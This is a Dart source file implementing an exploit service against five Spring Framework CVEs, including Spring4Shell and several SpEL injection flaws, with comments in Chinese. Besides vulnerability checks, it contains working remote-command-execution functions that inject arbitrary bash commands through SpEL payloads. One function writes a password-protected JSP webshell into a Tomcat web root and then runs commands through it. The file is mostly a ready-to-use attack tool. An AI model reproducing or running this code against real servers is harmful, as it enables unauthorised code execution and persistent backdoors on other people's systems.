import 'package:http/http.dart' as http;

enum SpringVulnType {
  springCloudFunction('CVE-2022-22963', 'Spring Cloud Function SpEL 注入'),
  spring4Shell('CVE-2022-22965 (Spring4Shell)', 'ClassLoader 操控写 Webshell'),
  springDataCommons('CVE-2018-1273', 'Spring Data Commons SpEL 注入'),
  springDataRest('CVE-2017-8046', 'Spring Data REST PATCH SpEL 注入'),
  springSecurityOauth('CVE-2016-4977', 'Spring Security OAuth SpEL 注入');

  const SpringVulnType(this.label, this.desc);
  final String label;
  final String desc;
}

class SpringResult {
  final bool vulnerable;
  final String vulnName;
  final String detail;
  SpringResult(this.vulnerable, this.vulnName, this.detail);
}

class SpringExpService {
  final Uri baseUri;
  final Duration timeout;

  SpringExpService({required String url, this.timeout = const Duration(seconds: 10)})
      : baseUri = Uri.parse(url.endsWith('/') ? url : '$url/');

  // CVE-2022-22963: Spring Cloud Function routing-expression SpEL
  Future<SpringResult> checkSpringCloudFunction() async {
    try {
      final detect = await http.post(
        Uri.parse('${baseUri}functionRouter'),
        headers: {
          'spring.cloud.function.routing-expression': '233*233',
          'Content-Type': 'text/plain',
        },
        body: 'test',
      ).timeout(timeout);
      if (detect.body.contains('54289') || (detect.statusCode == 500 && detect.body.contains('routingExpression'))) {
        return SpringResult(true, 'CVE-2022-22963', 'Spring Cloud Function SpEL routing-expression 注入存在');
      }
    } catch (_) {}
    return SpringResult(false, 'CVE-2022-22963', '');
  }

  // CVE-2022-22965 (Spring4Shell): ClassLoader 写 Webshell
  Future<SpringResult> checkSpring4Shell() async {
    try {
      final url = '${baseUri}?class.module.classLoader.resources.context.parent.pipeline.first.pattern=test';
      final res = await http.get(Uri.parse(url), headers: {
        'suffix': '%>',
        'c1': 'Runtime',
        'c2': '<%',
        'DNT': '1',
      }).timeout(timeout);
      if (res.statusCode != 404 && res.statusCode != 400) {
        return SpringResult(true, 'CVE-2022-22965 (Spring4Shell)', '目标可能存在 Spring4Shell，返回状态 ${res.statusCode}');
      }
    } catch (_) {}
    return SpringResult(false, 'CVE-2022-22965 (Spring4Shell)', '');
  }

  // CVE-2018-1273: Spring Data Commons SpEL via username field
  Future<SpringResult> checkSpringDataCommons() async {
    try {
      const payload = 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("id")]=&password=&repeatedPassword=';
      final res = await http.post(
        Uri.parse('${baseUri}users?page=&size=5'),
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: payload,
      ).timeout(timeout);
      if (res.statusCode == 500 || res.body.contains('SpelEvalException') || res.body.contains('EL1008E')) {
        return SpringResult(true, 'CVE-2018-1273', 'Spring Data Commons SpEL 注入，服务端处理了 SpEL 表达式');
      }
    } catch (_) {}
    return SpringResult(false, 'CVE-2018-1273', '');
  }

  // CVE-2017-8046: Spring Data REST PATCH SpEL
  Future<SpringResult> checkSpringDataRest() async {
    try {
      const body = '[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{105,100}))/lastname", "value": "vulhub" }]';
      final res = await http.patch(
        Uri.parse('${baseUri}customers/1'),
        headers: {'Content-Type': 'application/json-patch+json'},
        body: body,
      ).timeout(timeout);
      if (res.statusCode == 200 || res.statusCode == 500) {
        return SpringResult(true, 'CVE-2017-8046', 'Spring Data REST PATCH SpEL 注入端点响应，状态 ${res.statusCode}');
      }
    } catch (_) {}
    return SpringResult(false, 'CVE-2017-8046', '');
  }

  // CVE-2016-4977: Spring Security OAuth SpEL via response_type
  Future<SpringResult> checkSpringSecurityOauth() async {
    try {
      final url = '${baseUri}oauth/authorize?response_type=\${233*233}&client_id=acme&scope=openid&redirect_uri=http://test';
      final res = await http.get(Uri.parse(url)).timeout(timeout);
      if (res.body.contains('54289') || res.headers['location']?.contains('54289') == true) {
        return SpringResult(true, 'CVE-2016-4977', 'Spring Security OAuth SpEL 注入，233*233=54289 验证通过');
      }
    } catch (_) {}
    return SpringResult(false, 'CVE-2016-4977', '');
  }

  Future<SpringResult> checkSingle(SpringVulnType type) async {
    switch (type) {
      case SpringVulnType.springCloudFunction: return checkSpringCloudFunction();
      case SpringVulnType.spring4Shell: return checkSpring4Shell();
      case SpringVulnType.springDataCommons: return checkSpringDataCommons();
      case SpringVulnType.springDataRest: return checkSpringDataRest();
      case SpringVulnType.springSecurityOauth: return checkSpringSecurityOauth();
    }
  }

  // 执行命令 - CVE-2022-22963
  Future<String?> execSpringCloudFunction(String cmd) async {
    try {
      final spel2 = 'new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"$cmd\"}).getInputStream()).useDelimiter(\"\\\\A\").next()';
      final res = await http.post(
        Uri.parse('${baseUri}functionRouter'),
        headers: {
          'spring.cloud.function.routing-expression': spel2,
          'Content-Type': 'text/plain',
        },
        body: 'test',
      ).timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }

  // 执行命令 - CVE-2018-1273
  Future<String?> execSpringDataCommons(String cmd) async {
    try {
      final spel = 'username[T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"$cmd\"}).getInputStream(),T(java.nio.charset.Charset).forName(\"UTF-8\"))]=&password=&repeatedPassword=';
      final res = await http.post(
        Uri.parse('${baseUri}users?page=&size=5'),
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: spel,
      ).timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }

  // Spring4Shell: 写入 Webshell 再执行
  Future<String?> execSpring4Shell(String cmd) async {
    try {
      final writeUrl = '${baseUri}?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=';
      await http.get(Uri.parse(writeUrl), headers: {
        'suffix': '%>',
        'c1': 'Runtime',
        'c2': '<%',
      }).timeout(timeout);
      await Future.delayed(const Duration(seconds: 1));
      final execUrl = '${baseUri}tomcatwar.jsp?pwd=j&cmd=${Uri.encodeComponent(cmd)}';
      final res = await http.get(Uri.parse(execUrl)).timeout(timeout);
      if (res.statusCode == 200 && res.body.isNotEmpty) {
        return res.body;
      }
      return null;
    } catch (_) {
      return null;
    }
  }

  Future<String?> execRce(SpringVulnType type, String cmd) async {
    switch (type) {
      case SpringVulnType.springCloudFunction: return execSpringCloudFunction(cmd);
      case SpringVulnType.spring4Shell: return execSpring4Shell(cmd);
      case SpringVulnType.springDataCommons: return execSpringDataCommons(cmd);
      default: return null;
    }
  }
}
